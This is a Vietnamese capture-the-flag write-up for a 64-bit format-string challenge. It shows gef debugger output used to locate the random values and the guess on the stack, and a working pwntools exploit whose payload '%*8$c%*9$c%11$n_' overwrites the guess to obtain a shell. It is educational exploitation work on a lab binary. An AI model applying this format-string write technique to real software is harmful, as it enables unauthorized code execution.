Ta được cung cấp 1 file binary với tên bài fmt xmaster thì với hint là :

```
Use * to have a variable field width, equals to an signed integer on the stack, can combine with positional argument. Eg. %*10$c: print a number of characters equals to the 10th argument.
```

Giờ ta sẽ nhìn sơ qua file binary được cung cấp và các chế độ bảo vệ


![image](https://user-images.githubusercontent.com/114044703/213352879-e9926848-6445-4a04-9af9-ce90505da6a8.png)

![image](https://user-images.githubusercontent.com/114044703/213352929-16afa3f6-655c-4344-a371-107803f3e389.png)

Vậy chúng ta sẽ làm việc với file binary 64 bit. Khi chạy thì chương trình sẽ yêu cầu ta nhập tên và con số may mắn. Nếu sai sẽ dừng chương trình.

![image](https://user-images.githubusercontent.com/114044703/213353820-28782d93-403b-41c6-aa46-94f2da3a3cfc.png)

Sau khi dịch chương trình bằng ghidra thì ta thấy chương trình sẽ lấy ran1 và ran2 từ "dev/urandom" sau đó nếu input = ran1 + ran2 thì sẽ thực thi system("/bin/sh").

#BUG: Ngay tại hàm in ra name không chứa format strings nên ta có thể nghĩ ra 2 cách khai thác chương trình:

Cách 1: Đè lên tổng ran1 và ran2 sao cho bằng với input ta ghi vào bằng cách sử dụng %n

Cách 2: Thay đổi input bằng với lại ran1+ran2 bằng cách sử dụng %n

Giờ ta sẽ debug chương trình và đặt break point ngay tại printf bị lỗi fmt và trước khi cộng 2 biến ran1 và ran2 để xác định vị trí của ran1 và ran2:

```
gef➤  r
Starting program: /home/kali/Downloads/kcsc/fmt/chall 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc1000'
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
your name:
%7$p
you can guess a number,if you are lucky I will give you a gift:
123123

Breakpoint 1, 0x0000000000401345 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x206f6c6c        
$rdx   : 0x0               
$rsp   : 0x007fffffffdd80  →  0x0000000000000000
$rbp   : 0x007fffffffde20  →  0x0000000000000001
$rsi   : 0x6c6c6568        
$rdi   : 0x007fffffffddb0  →  0x000000000a7025 ("%p\n"?)
$rip   : 0x00000000401345  →  <main+271> call 0x4010f0 <printf@plt>
$r8    : 0x1999999999999999
$r9    : 0x0               
$r10   : 0x00000000402065  →  0x6c00206f6c6c6568 ("hello "?)
$r11   : 0x007ffff7c60770  →  <printf+0> endbr64 
$r12   : 0x007fffffffdf38  →  0x007fffffffe283  →  "/home/kali/Downloads/kcsc/fmt/chall"
$r13   : 0x00000000401236  →  <main+0> endbr64 
$r14   : 0x00000000403e18  →  0x00000000401200  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd80│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffdd88│+0x0008: 0x0000000300000000
0x007fffffffdd90│+0x0010: 0x000000000000bd67
0x007fffffffdd98│+0x0018: 0x0000000000005d99
0x007fffffffdda0│+0x0020: 0x000000000001e0f3
0x007fffffffdda8│+0x0028: 0x007fffffffdda0  →  0x000000000001e0f3
0x007fffffffddb0│+0x0030: 0x000000000a7025 ("%p\n"?)     ← $rdi
0x007fffffffddb8│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401339 <main+259>       lea    rax, [rbp-0x70]
     0x40133d <main+263>       mov    rdi, rax
     0x401340 <main+266>       mov    eax, 0x0
 →   0x401345 <main+271>       call   0x4010f0 <printf@plt>
   ↳    0x4010f0 <printf@plt+0>   endbr64 
        0x4010f4 <printf@plt+4>   bnd    jmp QWORD PTR [rip+0x2f35]        # 0x404030 <printf@got.plt>
        0x4010fb <printf@plt+11>  nop    DWORD PTR [rax+rax*1+0x0]
        0x401100 <close@plt+0>    endbr64 
        0x401104 <close@plt+4>    bnd    jmp QWORD PTR [rip+0x2f2d]        # 0x404038 <close@got.plt>
        0x40110b <close@plt+11>   nop    DWORD PTR [rax+rax*1+0x0]
────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x007fffffffddb0 → 0x000000000a7025 ("%p\n"?),
   $rsi = 0x0000006c6c6568,
   $rdx = 0x00000000000000
)
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x401345 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401345 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  tele
0x007fffffffdd80│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffdd88│+0x0008: 0x0000000300000000
0x007fffffffdd90│+0x0010: 0x000000000000bd67
0x007fffffffdd98│+0x0018: 0x0000000000005d99
0x007fffffffdda0│+0x0020: 0x000000000001e0f3
0x007fffffffdda8│+0x0028: 0x007fffffffdda0  →  0x000000000001e0f3
0x007fffffffddb0│+0x0030: 0x000000000a7025 ("%p\n"?)     ← $rdi
0x007fffffffddb8│+0x0038: 0x0000000000000000
0x007fffffffddc0│+0x0040: 0x0000000000000000
0x007fffffffddc8│+0x0048: 0x0000000000000000
gef➤  ni
hello 0x300000000
```

Vậy ```0x007fffffffdd88│+0x0008: 0x000000030000000``` là stack tại vị trí thứ 7.

```
$rax   : 0x5d99            
$rbx   : 0x0               
$rcx   : 0x2e2e2e2065657320 (" see ..."?)
$rdx   : 0xbd67            
$rsp   : 0x007fffffffdd80  →  0x0000000000000000
$rbp   : 0x007fffffffde20  →  0x0000000000000001
$rsi   : 0x7320656d2074656c ("let me s"?)
$rdi   : 0x007fffffffd820  →  0x007ffff7c620d0  →  <funlockfile+0> endbr64 
$rip   : 0x0000000040136c  →  <main+310> add rdx, rax
$r8    : 0x0               
$r9    : 0x007fffffffdc50  →  "6c6c6568"
$r10   : 0x0000000040206c  →  "let me see ..."
$r11   : 0x246             
$r12   : 0x007fffffffdf38  →  0x007fffffffe283  →  "/home/kali/Downloads/kcsc/fmt/chall"
$r13   : 0x00000000401236  →  <main+0> endbr64 
$r14   : 0x00000000403e18  →  0x00000000401200  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd80│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffdd88│+0x0008: 0x0000000300000000
0x007fffffffdd90│+0x0010: 0x000000000000bd67
0x007fffffffdd98│+0x0018: 0x0000000000005d99
0x007fffffffdda0│+0x0020: 0x000000000001e0f3
0x007fffffffdda8│+0x0028: 0x007fffffffdda0  →  0x000000000001e0f3
0x007fffffffddb0│+0x0030: 0x000000000a7025 ("%p\n"?)
0x007fffffffddb8│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401359 <main+291>       call   0x4010f0 <printf@plt>
     0x40135e <main+296>       mov    rdx, QWORD PTR [rbp-0x90]
     0x401365 <main+303>       mov    rax, QWORD PTR [rbp-0x88]
●→   0x40136c <main+310>       add    rdx, rax
     0x40136f <main+313>       mov    rax, QWORD PTR [rbp-0x80]
     0x401373 <main+317>       cmp    rdx, rax
     0x401376 <main+320>       jne    0x4013b1 <main+379>
     0x401378 <main+322>       lea    rax, [rip+0xd01]        # 0x402080
     0x40137f <main+329>       mov    rdi, rax
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x40136c in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40136c → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```
-> ran1 nằm ở vị trí thứ 8 trên stack, ran2 nằm ở vị trí thứ 9
Vậy cách 1 không thể thực hiện được vì tổng 2 ran k được lưu vào stack

Cách 2: ta thấy 
hex(123123)=0x000000000001e0f3 vậy input là ngay tại 

```
0x007fffffffdda0│+0x0020: 0x000000000001e0f3                    
0x007fffffffdda8│+0x0028: 0x007fffffffdda0  →  0x000000000001e0f3
```
Vậy ta có thể dùng địa chi thứ 2 là 0x007fffffffdda8 để ghi đè vì ta không cần cung cấp thêm địa chỉ cho %n nữa

Ý Tưởng khai thác: sử dụng %*$c mà đề đã gợi ý tại vị trí stack thứ 8 và thứ 9 để in ra số ký tự bằng với giá trị ran1+ran2 vào vị trí thứ 11 trên stack đồng thời là input

Ta sẽ khai thác với những dữ kiện trên :

```
from pwn import *
t=process('./chall')
#gdb.attach(t,api=True)
payload=b"%*8$c%*9$c%11$n_"
t.sendlineafter(b"your name:",payload)
t.sendlineafter(b"give you a gift",b"123123")
t.interactive()
```

Và sau khi chạy:

![image](https://user-images.githubusercontent.com/114044703/213358395-d02c085d-64fc-4fb1-9cd1-1687ee2b8b62.png)



